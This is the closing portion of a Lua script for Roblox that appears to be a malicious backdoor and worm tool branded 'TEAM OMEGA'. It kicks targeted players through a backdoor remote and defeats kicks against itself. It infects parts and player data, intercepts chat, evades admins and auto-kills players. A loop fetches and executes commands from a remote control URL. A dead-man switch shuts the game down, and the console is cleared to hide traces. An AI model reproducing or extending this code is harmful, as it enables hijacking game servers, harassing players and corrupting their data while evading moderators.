                            backdoorRemote:FireServer("kick", targetPlayer)
                            following = false
                            statusLabel.Text = "Target kicked and logged."
                            targetBtn.Text = "Follow"
                            targetBtn.BackgroundColor3 = Color3.fromRGB(255,80,0)
                            break
                        end
                    end
                end
                task.wait(5)
            end
        end)
    end)

    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40) end)
    return gui
end

-- ===================[ SLOW BURN AUTOMATION ]===================
local function startSlowBurn()
    task.spawn(function() while true do task.wait(spreadInterval) if autoSpreadEnabled then autoSpreadTrigger() end end end)
end

-- ===================[ MAIN LAUNCH ]===================
local function Launch()
    AntiKick()
    plantFakeTraces()
    CreateMenuGUI()

    task.spawn(function()
        while commandUrl == "" do task.wait(1) end
        poisonAllParts()
        ChatIntercept()
        startSlowBurn()
        plantDormantSpore()
        infectPlayerData()
        adminEvasionLoop()
        autoKillLoop()
        preemptDefense()

        while true do
            task.wait(2)
            if commandUrl ~= "" then
                local ok, res = pcall(function() return HttpService:RequestAsync({Url = commandUrl, Method = "GET", Headers = {["User-Agent"] = "Omega/1.0"}}) end)
                if ok and res.Success then
                    lastSuccessfulFetch = os.time()
                    local decrypted = decode(res.Body:gsub("%s+", " "))
                    local cmd = decrypted:match("امر%s+([%a]+)") or decrypted:match("command%s+([%a]+)") or decrypted:match("([%a]+)")
                    if cmd then executeCommand(cmd:lower()) end
                end
            end
            if os.time() - lastSuccessfulFetch > DEADMAN_SECONDS then
                sendGlobalMessageToAllPlayers(GLOBAL_MESSAGE)
                pcall(function() game:Shutdown() end)
            end
            ClearConsole()
        end
    end)
    print("💀 TEAM OMEGA – AWAITING ENCRYPTION KEY 💀")
end
Launch()
